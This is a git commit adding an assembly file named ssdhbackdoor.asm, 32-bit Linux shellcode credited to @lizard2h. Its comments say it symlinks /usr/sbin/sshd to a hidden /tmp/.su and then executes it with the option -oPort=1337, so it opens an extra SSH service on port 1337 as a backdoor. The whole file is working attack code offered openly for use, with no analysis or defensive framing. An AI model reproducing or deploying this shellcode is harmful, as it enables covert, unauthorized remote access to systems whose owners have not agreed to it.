608398ebee8763b0d657dd78f65306fb148708c7
lizard2h <37278209+lizard2h@users.noreply.github.com>
2018-03-15 15:28:41 -0300

    Create ssdhbackdoor.asm

---
+++ ssdhbackdoor.asm
@@ -0,0 +1,56 @@
+section .text
+ global _start:
+
+_start:
+	
+	  ; symlink("/usr/sbin/sshd", "/tmp/.su")
+    ; by @lizard2h
+    ; thanks to @k3nsh1n
+
+	xor eax, eax
+	xor ebx, ebx
+	xor ecx, ecx
+
+	mov bx, 0x6468
+
+	push ebx
+	push 0x73732f6e
+	push 0x6962732f
+	push 0x7273752f
+
+	mov ebx, esp
+
+	mov al, 83
+
+	push ecx
+	push 0x75732e2f
+	push 0x706d742f
+
+	mov ecx, esp
+
+	int 0x80
+
+	; execve("/tmp/.su", ["/tmp/.su","-oPort=1337"], [ NULL ])
+
+	xor eax, eax
+	xor ebx, ebx
+	xor edx, edx
+
+	mov ebx, ecx
+
+	push eax
+	push 0x37333331
+	push 0x333d7472
+	push 0x6f506f2d
+
+	mov ecx, esp
+
+	push eax
+	push ecx
+	push ebx
+
+	mov ecx, esp
+
+	mov al, 11
+
+	int 0x80
